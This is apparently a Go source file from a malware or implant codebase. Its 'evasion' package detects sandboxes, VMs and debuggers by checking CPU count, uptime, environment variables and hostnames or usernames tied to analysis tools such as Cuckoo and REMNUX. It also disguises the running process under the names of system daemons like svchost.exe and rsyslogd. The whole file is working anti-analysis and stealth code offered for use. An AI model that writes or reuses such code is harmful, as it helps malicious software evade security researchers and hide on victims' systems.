// Package evasion provides sandbox detection, anti-debugging, and process masquerade.
package evasion

import (
	"net"
	"os"
	"runtime"
	"strings"
	"time"
)

// IsSandbox returns true if evidence of a sandbox/AV/VM environment is detected.
// Uses multiple low-noise heuristics to minimize false positives.
func IsSandbox() bool {
	checks := []func() bool{
		checkCPUCount,
		checkUptime,
		checkSandboxEnv,
		checkSandboxHostname,
		checkSandboxUsername,
		checkNetworkInterfaces,
	}
	hits := 0
	for _, check := range checks {
		if check() {
			hits++
		}
	}
	// Require 2+ signals to avoid false positives
	return hits >= 2
}

// IsBeingDebugged returns true if a debugger is attached.
func IsBeingDebugged() bool {
	return checkDebugger()
}

// MasqueradeProcess attempts to disguise the process name.
// On Linux: sets os.Args[0] to a plausible name.
func MasqueradeProcess() {
	names := masqueradeNames()
	if len(names) == 0 {
		return
	}
	// Pick a name that looks plausible for the OS
	name := names[0]
	if len(os.Args) > 0 {
		os.Args[0] = name
	}
	setProcName(name)
}

func masqueradeNames() []string {
	switch runtime.GOOS {
	case "linux":
		return []string{
			"/usr/sbin/rsyslogd",
			"/usr/lib/systemd/systemd-journald",
			"/sbin/agetty",
			"/usr/bin/dbus-daemon",
		}
	case "windows":
		return []string{
			"svchost.exe",
			"RuntimeBroker.exe",
			"SearchProtocolHost.exe",
		}
	case "darwin":
		return []string{
			"/usr/sbin/cfprefsd",
			"/System/Library/CoreServices/cfprefsd",
		}
	}
	return nil
}

// ── Individual Checks ─────────────────────────────────────────────────────────

func checkCPUCount() bool {
	// Most sandboxes use 1-2 CPUs
	return runtime.NumCPU() <= 1
}

func checkUptime() bool {
	// Sandboxes typically have very low uptime
	uptime := getUptime()
	return uptime > 0 && uptime < 10*time.Minute
}

func checkSandboxEnv() bool {
	sandboxEnvVars := []string{
		"VBOX_INSTALL_PATH",   // VirtualBox
		"VBOX_MSI_INSTALL_PATH",
		"VMWARE_ROOT_FOLDER",  // VMware
		"VMWARE_STATUS_FOLDER",
		"SANDBOXIE_HOME",      // Sandboxie
		"CUCKOO_SANDBOX",      // Cuckoo
		"ANALYSIS_GUEST",
		"ANALYSIS_HOST",
	}
	for _, v := range sandboxEnvVars {
		if os.Getenv(v) != "" {
			return true
		}
	}
	return false
}

func checkSandboxHostname() bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}
	hostname = strings.ToLower(hostname)
	sandboxHostnames := []string{
		"sandbox", "malware", "virus", "analyse", "analysis",
		"cuckoo", "inetsim", "flare", "remnux", "any.run",
		"joebox", "wildfire",
	}
	for _, s := range sandboxHostnames {
		if strings.Contains(hostname, s) {
			return true
		}
	}
	return false
}

func checkSandboxUsername() bool {
	user := strings.ToLower(os.Getenv("USER") + os.Getenv("USERNAME"))
	sandboxUsers := []string{
		"sandbox", "malware", "virus", "user", "admin", "analyst",
		"john", "test", "sample",
	}
	for _, s := range sandboxUsers {
		if user == s {
			return true
		}
	}
	return false
}

func checkNetworkInterfaces() bool {
	// Real machines have multiple non-loopback interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	count := 0
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback == 0 &&
			iface.Flags&net.FlagUp != 0 {
			count++
		}
	}
	// Single network interface is suspicious
	return count == 0
}
